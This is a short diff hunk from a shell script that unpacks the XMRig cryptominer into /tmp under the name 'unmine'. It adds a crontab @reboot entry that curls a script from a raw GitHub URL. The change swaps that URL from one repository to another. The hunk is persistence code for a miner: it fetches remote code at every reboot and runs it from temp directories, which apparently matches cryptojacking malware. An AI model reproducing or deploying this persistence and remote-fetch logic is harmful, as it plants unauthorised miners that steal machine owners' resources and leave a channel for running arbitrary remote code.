@@ -14,7 +14,7 @@ cd /tmp/ && tar -xzvf unmine.tar.gz
 rm -rf unmine.tar.gz
 mv /tmp/xmrig-6.12.2 /tmp/unmine
 #CREATING CRONTAB RUN XMRIG AFTER REBOOT
-url="https://raw.githubusercontent.com/fhaa123/miner/master/unmine.sh"
+url="https://raw.githubusercontent.com/johnfelipe/xmr/main/unmine.sh"
 if crontab -l | grep "@reboot cd /var/tmp && curl -O $url">/dev/null 2>&1 ; then
   echo "Crontab already exist!"
   echo "Skiping...!"
